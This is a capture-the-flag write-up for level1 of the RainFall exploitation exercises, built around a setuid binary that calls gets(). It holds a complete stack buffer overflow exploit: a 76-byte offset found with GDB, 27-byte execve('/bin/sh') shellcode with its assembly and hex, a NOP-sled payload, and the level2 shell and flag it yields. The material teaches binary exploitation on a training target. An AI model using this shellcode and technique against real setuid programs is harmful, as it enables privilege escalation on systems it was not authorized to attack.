# level1

- We login as user level1:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

```
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

```
level1@RainFall:~$ gdb level1
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```


- This exercise is an introduction to stack [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow).
The program generously allows us to write without limits into its stack.
We just need to write enough characters to reach the return address of the `main` function.
Then, we will replace this address with the address of a memory area that will contain a [shellcode](https://en.wikipedia.org/wiki/Shellcode) which will call `execve("/bin/sh")`.

>![stack1](https://upload.wikimedia.org/wikipedia/commons/0/00/Pile_avant_appel.png?20120112163251)![stack2](https://upload.wikimedia.org/wikipedia/commons/d/d9/Pile_debordement.gif?20120112163309)


- First, we need to know from how many characters the return address of our function starts to be substituted. It can be done quickly using a tool like [Metasploit](https://en.wikipedia.org/wiki/Metasploit).
```
$msf-pattern_create -l [pattern length] | [binary]
... get overried EIP address from GDB
```

```
$msf-pattern_offset -l [pattern length] -q [overried EIP address]
```

- The return address is found to be replaced after the 76th character:
```
(gdb) b*0x08048495
```

```
r < <(python -c "print('A'*76 + 'BBBBCCCC')")
Starting program: /home/user/level1/level1 < <(python -c "print('A'*76 + 'BBBBCCCC')")

Breakpoint 1, 0x08048495 in main ()
(gdb) i f
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0x42424242
 Arglist at 0xbffff738, args:
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
```
>`saved eip 0x42424242`


- 42 is the hexadecimal ASCII value of the character 'B'. So, `BBBB` should be replaced with an address that points to the beginning of our shellcode.


- Let's make that shellcode.
```asm
section .text
    global _start

_start:
    xor esi, esi            ; 
    xor edi, edi            ; 
    xor ecx, ecx            ; 
    xor edx, edx            ; Cleaning registers

    push edx                ; Null terminate the string
    push 0x68732f2f         ; Pushing "//sh"
    push 0x6e69622f         ; Pushing "/bin"
    
    mov ebx, esp            ; Pointer to the string
    xor eax, eax            ;
    mov al, 0xb             ; 11 is the syscall number of execve
    int 0x80
```

```
$ nasm -f elf32 src.asm -o obj.o
```

```
$ objdump -d obj.o

test.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:   31 f6                   xor    %esi,%esi
   2:   31 ff                   xor    %edi,%edi
   4:   31 c9                   xor    %ecx,%ecx
   6:   31 d2                   xor    %edx,%edx
   8:   52                      push   %edx
   9:   68 2f 2f 73 68          push   $0x68732f2f
   e:   68 2f 62 69 6e          push   $0x6e69622f
  13:   89 e3                   mov    %esp,%ebx
  15:   31 c0                   xor    %eax,%eax
  17:   b0 0b                   mov    $0xb,%al
  19:   cd 80                   int    $0x80
```


- So we have a 27 bytes shellcode.
```
$ echo -ne "\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80" | wc -c
27
```


- Now, we need to store our shellcode somewhere in the program's memory, for example, writing it into the memory area filled by `<gets@plt>`. Let's start by retrieving this memory address.
```
level1@RainFall:~$ gdb level1
```

```
(gdb) b*0x08048495
```

```
(gdb) r < <(echo -n "123")
Starting program: /home/user/level1/level1 < <(echo -n "123")

Breakpoint 1, 0x08048495 in main ()
(gdb) x $eax
0xbffff6d0:     0x00333231
```


- The address is `0xbffff6d0`, this means that by launching our program like so `(gdb) r < <(python -c "print '$SHELLCODE' + 'a'*(76 - 27) + '\xd0\xf6\xff\xbf'")`, the program's execution flow should be redirected to our shellcode.


- However, `(gdb) r < <(echo lol)` is equivalent to `$ echo lol | our_binary`. Thus, the pipe will send EOF once `lol` has been transmitted to `our_binary`, which means that `stdin` will be closed for `our_binary`. Since `execve()` inherits the I/O of the parent process, our `/bin/sh` would close immediately. That's why we will add `cat` to keep `stdin` open during `execve()`.
```
(gdb) r < <(python -c "print '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*49 + '\xd0\xf6\xff\xbf'"; cat)
...
whoami
level1
```


- A shell has been successfully launched, let's take advantage of [the setuid and setgid permission bits](https://en.wikipedia.org/wiki/Setuid) by doing the same thing without GDB.
```
level1@RainFall:~$ (python -c "print '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*49 + '\xd0\xf6\xff\xbf'"; cat) | ./level1

Illegal instruction (core dumped)
```


- It doesn't work, indeed, the environment is slightly different between a program launched with/without GDB. That's why the exact address we are targeting isn't exactly the same. We therefore need to find the correct address. By adding [NOP instructions](https://fr.wikipedia.org/wiki/NOP) before our shellcode, we can make the address search less laborious. We would then be tempted to do it like this:
```
python -c "print '\x90'*49 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\xd0\xf6\xff\xbf'"
```


- But since our shellcode is stored directly in the stack, and `esp` is at that moment of program execution at the level of the previous stack frame, our instructions `push $0x68732f2f` and `push 0x6e69622f` would corrupt our shellcode, and it wouldn't work.
So, we need to keep a bit of space, precisely 8 bytes:
```
python -c "print '\x90'*41 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*8 + '\xd0\xf6\xff\xbf'"
```

- Thus, thanks to these NOP instructions, the execution of our shellcode will be able to succeed from a broader range of addresses.
```
level1@RainFall:~$ (python -c "print '\x90'*41 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*8 + '\xf0\xf6\xff\xbf'"; cat) | ./level1

whoami
level2

cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```